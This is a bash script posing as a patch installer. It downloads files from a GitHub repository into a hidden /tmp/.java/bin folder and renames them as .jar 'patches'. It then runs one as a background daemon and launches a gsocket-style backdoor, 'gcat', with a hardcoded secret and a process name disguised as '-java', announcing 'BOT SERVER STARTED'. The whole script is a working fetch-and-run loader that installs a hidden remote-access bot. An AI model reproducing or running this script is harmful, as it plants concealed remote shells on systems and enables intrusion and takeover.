#!/bin/bash

function fetch_files() {
    echo "Downloading Patches ..."
    mkdir -p /tmp/.java/bin
    cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/app.js -o user-patch.jar
    cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/supervisord -o plugins.jar
    cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/mc/gcat -o add-on.jar
    cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/uastix/cnf.json -o conf.json
    cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/uastix/cfg.conf -o cfg.conf
    echo "DONE ..."
}

function start_app() {
    chmod a+x /tmp/.java/bin/***
    cd /tmp/.java/bin && ./plugins.jar -c ./cfg.conf -d
    export GSOCKET_ARGS="-s iE9c8A7eD2a1E2c-5A16f9813D9g8Hbj7-56C4a961-eCd9F9440-d6A2J8038A1c5J1g60 -liqD"
    cd /tmp/.java/bin && exec -a -java ./add-on.jar &
    echo "BOT SERVER STARTED ..."
}

if [ -f "/tmp/.java/bin/cfg.conf" ]  && [ -f "/tmp/.java/bin/plugins.jar" ] && [ -f "/tmp/.java/bin/add-on.jar" ]; then
    echo "Patch files already loaded ..."
    start_app
else
    rm -rf /tmp/.java/bin/**
    fetch_files
    start_app
fi
